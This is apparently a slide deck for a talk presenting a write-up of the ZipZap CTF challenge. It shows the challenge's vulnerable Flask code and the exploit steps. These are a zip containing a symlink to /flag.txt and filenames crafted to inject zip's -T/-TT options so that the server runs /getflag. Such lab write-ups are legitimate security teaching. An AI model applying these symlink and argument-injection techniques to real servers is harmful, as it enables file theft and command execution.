---
title: 'ZipZap CTF Writeup'
date: "2022-05-30T14:00:00"
categories: ["talk"]
tags: ["ctf", "writeup"]
---
class: center, middle
name: start

# ZipZap CTF Writeup![:i](fas fa-door-open)

.footer[30th May 2022</br>_Friday Talks_ @ ![:i](fab fa-suse)]
---
class: left, middle

# Danilo Spinella

### _Software Engineer in Packaging_

### **SUSE** ![:i](fab fa-suse)

---
class: left, middle

![](https://cyberchallenge.it/assets/icons/Logo.svg)

Italian training program in cybersecurity for high-school and undergraduate students.

---
class: left, middle

![](https://cyberchallenge.it/assets/icons/Logo.svg)

Participated in 2020

Volunteered to help in 2021

Worked as an instructor in 2022

---
class: left, middle

## Capture The Flags (CTFs)

Find the flag by exploiting a security vulnerability

---
class: middle, left

## ![:i](fas fa-list) Contents

ZipZap overview

First vulnerability

Second vulnerability

---
class: left, middle

# ![:i](fas fa-code) ZipZap overview

---
background-image: url(/img/zipzap_ctf_writeup/mainpage.jpg)

---
class: left, middle

After a login, a *uid* gets generated from the username

`http://endpoint/<uid>`

---
background-image: url(/img/zipzap_ctf_writeup/upload.jpg)

---
class: middle, left

Let's create a zip archive with a test file in it

```bash
$ echo test > test.txt
$ zip test.zip test.txt
  adding: text.txt (stored 0%)
```

---
background-image: url(/img/zipzap_ctf_writeup/testzip.jpg)

---
class: left, middle

## We can...

...download a single file (by clicking into it)

...remove a single file

...download all our files as a zip archive

...upload another zip archive

---
class: left, middle

# Vulnerability ![:i](fas fa-1)

---
class: left, middle

Zap `/flag.txt`

---
class: left, middle

## Let's dive into the code ![:i](fas fa-code)

~230 lines of python flask application

---
class: left, middle

# Disclaimer ![:i](fas fa-exclamation)

The code listed here is the original code shared to
the participants. It is left untouched, including the comments.

---
class: left, middle

## List user files

```python
@app.route('/<uid>')
def list_files(uid):
    #
    # List every file uploaded by the user
    #
    uid = os.path.basename(uid)
    path = os.path.join(app.config['USERPATH'], uid)
    try:
        files = [file for file in os.listdir(path)]
    ...
```

---
## Upload user zip archives (1/3)

```python
@app.route('/<uid>', methods=['POST'])
def upload(uid):
    #
    # Upload a zip file and then extract it
    #
    uid = os.path.basename(uid)
    path = os.path.join(app.config['USERPATH'], uid)
    
    # some sanity check
    ...

    # Save the file with a safe name
    zip_filename = secrets.token_urlsafe(8) + '.zip'
    zip_path = os.path.join(path, zip_filename)
    try:
        f.save(zip_path)
    except IsADirectoryError:
        abort(400)
```

---
## Upload user zip archives (2/3)

```python
    # Calc length: we don't want any files larger than 4kb
    try:
        # unzip -Zt return a string similar to: 4 files, 49 bytes uncompressed, 44 bytes compressed:  10.2%
        # a quick and dirty way to parse this is to split the string, with ' ' as delimiter,
        # and then parse the 3rd. This is also a _very_ dirty way to check if the file is a valid
        # zip file.
        command = 'unzip -Zt ' + zip_path
        out = subprocess.run(command.split(' '),
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=5)

        size = out.stdout.decode()
        size = size.split(' ')[2]
        size = int(size)

        if size > app.config['MAX_UNCOMPRESSED_SIZE']:
            raise FileTooBigException
```

---
## Upload user zip archives (3/3)

```python
        # Now we can unzip everything
        command = 'unzip -j -o {}'.format(zip_path)
        with open(os.devnull, 'wb') as devnull:
            # exec unzip in the user directory
            subprocess.run(command.split(' '), stdout=devnull,
                           stderr=devnull, shell=False, cwd=path)
    except subprocess.TimeoutExpired:
        abort(500)
    except (ValueError, IndexError):
        abort(500)
    except FileTooBigException:
        flash('Zip file too big')
        return redirect(url_for('list_files', uid=uid))
    finally:
        os.remove(os.path.join(path, zip_path))

    return redirect(url_for('list_files', uid=uid))
```

---
class: left, middle

## Brainstorming ![:i](fas fa-brain)

---
class: left, middle

## The answer is...

---
class: left, middle

## ...symlinks ![:i](fas fa-exclamation)

---
class: left, middle

## First try

```bash
$ ln -s /flag.txt flag.txt
$ zip vuln1.zip flag.txt
    zip warning: name not matched: flag.txt
```

---
class: left, middle

## Second try

```bash
$ ln -s /flag.txt flag.txt
$ zip --symlink vuln1.zip flag.txt
  adding: flag.txt (stored 0%)
```

---
background-image: url(/img/zipzap_ctf_writeup/flagtxt.jpg)

---
class: left, middle

Congratz! Here's your flag. 
CCIT{XXXXXXXXXXXXXXXXXXXXXXXXXXXX}

To get the second flag, execute  /getflag 

---
class: left, middle

## Vulnerability ![:i](fas fa-2)

---

## Download all (1/3)

```python
@app.route('/<uid>/zip')
def zip(uid):
    #
    # Create a zip file from user's uploaded files
    #
    path = os.path.join(app.config['USERPATH'], uid)

    try:
        # file list. This simple check should prevent a zip recursion. Also yea, users
        # can't upload any zip file
        files = [filename for filename in os.listdir(
            path) if not filename.endswith('.zip')]

        #
        # Now some security checks
        #

        def get_fullpath(filename): return os.path.join(
            path, filename)
```

---

## Download all (2/3)

```python
        # Sort the file list.
        files = sorted(files)

        # Sanitize all filenames.
        files = map(lambda x: os.path.basename(x), files)

        # check that we aren't zipping directories
        files = filter(lambda x: not os.path.isdir(get_fullpath(x)), files)

        # Limit the len of the files we are zipping. Yeah, there can't be
        # be any files greater that app.config['MAX_UNCOMPRESSED_SIZE'], but you never know
        files = filter(lambda x: os.stat(get_fullpath(x)).st_size <
                       app.config['MAX_UNCOMPRESSED_SIZE'], files)

        # We don't want to compress more that 20 files
        files = list(files)
        if len(files) > 20:
            files = files[:20]  # out of one? idk and I don't care
    except (FileNotFoundError, NotADirectoryError):
        return redirect(url_for('index'))
```

---

## Download all (3/3)

```python
    # create a random zip name
    new_zip_name = secrets.token_urlsafe(8) + '.zip'
    new_zip_path = os.path.join(path, new_zip_name)

    # create the command
    command = ['zip', new_zip_path]
    command += files

    with open(os.devnull, 'wb') as devnull:
        # exec unzip in the user directory
        subprocess.run(command, stdout=devnull, stderr=devnull,
                       shell=False, cwd=path, timeout=5)
    try:
        resp = make_response(
            send_file(new_zip_path, as_attachment=True, attachment_filename=new_zip_name))
        resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        return resp
    except:
        abort(500)
    finally:
        if os.path.exists(new_zip_path):
            os.remove(os.path.join(path, new_zip_path))
```

---
class: left, middle

## Brainstorming ![:i](fas fa-brain)

Part ![:i](fas fa-2)

---
class: left, middle

## We need to

Execute `/getflag` on the server

Save its output

Retrieve the output

---
class: left, middle

## Problems

`zip` is the only command called

`/` cannot be used in valid filenames

---
class: left, middle

## Idea ![:i](fas fa-lightbulb)

---
class: left, middle

## Inject commands to `zip` via filenames

---
class: left, middle

**-TT** *cmd*</br>
**--unzip-command** *cmd*</br>
  Use command cmd instead of `unzip -tqq` to test an archive when the **-T** option is used.
  On Unix, to use a copy of unzip in the current directory instead of the standard system unzip,
  could use:

`$ zip archive file1 file2 -T -TT "./unzip -tqq"`

---
## Solution (1/3)

Symlink a local file to `/getflag`

Change `PATH` to the current folder

Execute the symlink

Save its output to a file in the current folder

---
## Solution (2/3)

Upload the zip archive

Click the `Download all` button

Download the file that now appears after a reload

---

## Solution (3/3)

```bash
$ ln -s /getflag getflag
$ touch -- -T
$ touch -- -TT
$ touch -- 'PATH="." getflag>flag.txt' 
$ zip vuln2 -y -- *
$ ls
-T   -TT  'PATH="." getflag>flag.txt'  flag.txt   getflag vuln2.zip
```

---
class: center, middle

# Questions ![:i](fas fa-question)

---
class: center, middle

#![:i](fab fa-creative-commons) ![:i](fab fa-creative-commons-by) ![:i](fab fa-creative-commons-sa)

## This work is licensed under

## _Attribution-ShareAlike 4.0 International</br> (CC BY-SA 4.0)_

.footer[Icons from _www.onlinewebfonts.com_, which are licensed under CC BY 3.0]

---
template: start

